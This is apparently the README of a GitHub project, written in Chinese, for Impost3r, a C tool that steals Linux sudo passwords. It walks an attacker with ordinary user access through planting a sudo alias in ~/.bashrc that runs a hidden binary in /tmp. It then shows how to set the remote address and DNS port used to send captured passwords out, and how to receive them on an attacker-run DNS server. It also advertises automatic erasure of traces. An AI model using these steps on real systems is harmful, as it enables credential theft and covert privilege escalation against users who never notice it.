![imposter.png](https://github.com/ph4ntonn/Impost3r/blob/master/img/Impost3r.png)

# Impost3r

[![GitHub issues](https://img.shields.io/github/issues/ph4ntonn/Impost3r)](https://github.com/ph4ntonn/Impost3r/issues)
[![GitHub stars](https://img.shields.io/github/stars/ph4ntonn/Impost3r)](https://github.com/ph4ntonn/Impost3r/stargazers)
[![GitHub forks](https://img.shields.io/github/forks/ph4ntonn/Impost3r)](https://github.com/ph4ntonn/Impost3r/network)
[![GitHub license](https://img.shields.io/github/license/ph4ntonn/Impost3r?label=license)](https://github.com/ph4ntonn/Impost3r/blob/master/LICENSE)

Impost3r是一个利用C语言编写,用来窃取linux下sudo密码的工具

用户可使用此程序在普通用户权限下，制造水坑，窃取合法用户的sudo密码

> 此工具仅限于安全研究和教学，用户承担因使用此工具而导致的所有法律和相关责任！ 作者不承担任何法律和相关责任！

## 特性

- 自动擦除行为痕迹
- 通过DNS协议传输结果
- 用户无感

## 依赖

- gcc

## 使用方法

- 首先假设攻击者控制了一台服务器，权限为普通用户权限

- 拷贝一份用户的.bashrc```cp ～/.bashrc /tmp/```，并将这份副本放在攻击者自定义的路径下(本例中放置在/tmp/目录下，攻击者可以修改)

- 修改用户根目录下的.bashrc(～/.bashrc)，在最后一行添加如下语句：

```
alias sudo='impost3r() {
if [ -f "/tmp/.impost3r" ]; then
/tmp/.impost3r "$@" && unalias sudo
else
unalias sudo;sudo "$@"
fi
}; impost3r'
```

- 添加完成后，保存文件并执行```source ~/.bashrc```

- 接着攻击者需要对Impost3r源代码进行修改：

```
# define MAX_RESEND 30  \\设置当窃取到密码之后，Impost3r向攻击者服务器发送用户密码的最大重试次数
# define RESEND_INTERVAL 5  \\设置每一次发送密码的间隔
# define FILENAME "/tmp/.impost3r"  \\设置Impost3r在目标服务器上的位置
# define BACKUP_BASHRC "/tmp/.bashrc" \\设置攻击者备份的源.bashrc在目标服务器上的位置
# define REMOTE_ADDRESS "192.168.0.12" \\设置回送密码的远程地址
# define REMOTE_PORT 53 \\设置回送密码的远程端口
```
- 修改完成后，保存并在当前目录执行```make```

- 在当前目录下得到编译完成的```.impost3r```文件

- 上传```.impost3r```文件至目标服务器的```/tmp/```文件夹下(仅为示例，可自行修改，只需与源代码中定义相同即可)

- 攻击者在自己的服务器上启动dns服务端程序，等待合法用户使用```sudo```后获取密码。

## 窃取效果

<img src="https://github.com/ph4ntonn/Impost3r/blob/master/img/Impost3r.gif" width="1200" >

## 注意事项

- Dns服务端程序我使用的是[Fdns](https://github.com/deepdarkness/Fdns)，并修改了一部分参数，大家可在文件夹Fdns下找到修改后的源代码，请自行利用命令```gcc -o dns main.c util.c```编译,当然，也可以用别的dns服务端程序，这里并不受限，但是必须是会回复dns response的服务端程序，而不是仅解析dns request。
- 程序窃取密码成功后将会自动擦除痕迹，并不需要攻击者上去手动清理
- 此程序仅是闲暇时开发学习，功能可能存在bug，请多多谅解，也欢迎反馈问题

### 致谢

- [Fdns](https://github.com/deepdarkness/Fdns) 
